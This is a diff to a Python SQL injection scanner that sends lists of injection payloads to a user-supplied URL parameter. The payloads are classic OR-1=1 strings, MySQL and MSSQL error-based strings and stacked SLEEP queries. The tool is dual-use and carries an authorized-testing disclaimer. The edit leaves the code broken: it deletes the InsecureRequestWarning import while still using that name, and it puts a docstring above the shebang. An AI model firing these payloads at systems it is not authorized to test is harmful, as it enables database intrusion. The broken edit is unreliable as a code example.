@@ -1,3 +1,15 @@
+"""
+SQL Injection Vulnerability Scanner
+
+This script is designed to detect SQL injection vulnerabilities in web applications by testing various payload types against a specified parameter in a target URL. It supports multiple SQL injection techniques and database types.
+
+Usage:
+    Run the script and follow the interactive prompts to specify the target URL, parameter to test, payload categories, and database type.
+
+Disclaimer:
+    This tool is for educational and authorized security testing purposes only. Unauthorized use may violate laws and ethical guidelines. Always obtain explicit permission before testing any system.
+"""
+
 #!/usr/bin/env python3
 import sys
 import os
@@ -5,18 +17,9 @@ import time
 import warnings
 import requests
 from urllib.parse import urlparse, urlunparse
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 # Suppress InsecureRequestWarning
 warnings.filterwarnings("ignore", category=InsecureRequestWarning)
-
-# Banner and disclaimer
-print("""
-#############################################
-#  Precision SQL Injection Scanner         #
-#  Use responsibly and with permission     #
-#############################################
-""")
 
 def get_user_choices():
     """Get user input for target and testing options."""
@@ -82,7 +85,7 @@ def generate_payloads(categories, db_type, db_info=None):
         classic = [
             ("' OR '1'='1", "Classic"),
             ("' OR 1=1--", "Classic"),
-            ("\" OR \"1\"=\"1", "Classic"),
+            ('" OR "1"="1', "Classic"),
             ("') OR ('1'='1", "Classic"),
             ("' OR 'a'='a", "Classic"),
         ]
@@ -117,7 +120,7 @@ def generate_payloads(categories, db_type, db_info=None):
         if db_type == '1':  # MySQL
             error.append(("' AND extractvalue(rand(),concat(0x3a,version()))--", "MySQL Error"))
         elif db_type == '2':  # MSSQL
-            error.append(("' AND 1=CONVERT(int,db_name()))--", "MSSQL Error"))
+            error.append(("' AND 1=CONVERT(int,db_name())--", "MSSQL Error"))
 
         payloads.extend(error)
 
@@ -153,7 +156,7 @@ def generate_payloads(categories, db_type, db_info=None):
         payloads.extend(time_based)
 
     # Stacked Queries
-    if '6' in categories or ('9' in categories and db_type in ['1','2','3']):  # MySQL/MSSQL/PostgreSQL
+    if '6' in categories or ('9' in categories and db_type in ['1', '2', '3']):  # MySQL/MSSQL/PostgreSQL
         stacked = [
             ("'; SELECT SLEEP(5)--", "Stacked"),
         ]
@@ -210,7 +213,7 @@ def test_injection(url, param, payloads):
             elapsed = time.time() - start_time
 
             if "Time-based" in payload_type and elapsed > 5:
-                print(f"[!] Potential vulnerability (delayed response: {elapsed:.2f}s)")
+                print(f"[!] Potential vulnerability (delayed response: {elapsed:.2f} s)")
                 vulnerable = True
             else:
                 print("[-] No obvious vulnerability detected")
@@ -223,10 +226,12 @@ def test_injection(url, param, payloads):
     return vulnerable
 
 if __name__ == "__main__":
+    print("Starting SQL Injection Vulnerability Scan...")
+    print("This tool is for educational and authorized testing only.")
     url, param, categories, db_type, db_info = get_user_choices()
     payloads = generate_payloads(categories, db_type, db_info)
 
-    print(f"\nStarting scan with {len(payloads)} payloads...")
+    print(f"\nInitiating scan with {len(payloads)} payloads...")
     if test_injection(url, param, payloads):
         print("\n[!] Potential vulnerabilities found!")
     else:
